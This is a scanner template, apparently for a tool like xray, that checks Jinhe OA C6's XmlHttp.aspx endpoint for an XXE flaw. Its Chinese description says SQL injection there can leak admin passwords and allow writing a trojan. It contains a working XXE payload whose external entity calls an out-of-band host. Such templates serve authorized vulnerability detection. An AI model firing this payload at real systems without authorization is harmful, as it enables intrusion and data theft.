id: jinhe-oa-xmlhttp-xxe

info:
  name: 金和OA-XmlHttp.aspx-XXE漏洞
  author: avic123
  severity: high
  verified: true
  description: |
    金和OA C6 XmlHttp.aspx接口处存在SQL注入漏洞和XXE漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://mrxn.net/jswz/jhsoft-LoginTemplate-XmlHttp-xxe-sqli.html
  tags: jinhe,oa,xxe
  created: 2025/09/11

set:
  oob: oob()
  oobHTTP: oob.HTTP
rules:
  r0:
    request:
      method: POST
      path: /c6/Jhsoft.Web.addmenu/LoginTemplate/XmlHttp.aspx/
      body: |
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [
        <!ENTITY % remote SYSTEM "{{oobHTTP}}/xxe_test">
        %remote;]>
        <root/>
    expression: response.status == 200 && oobCheck(oob, oob.ProtocolHTTP, 3)
expression: r0()
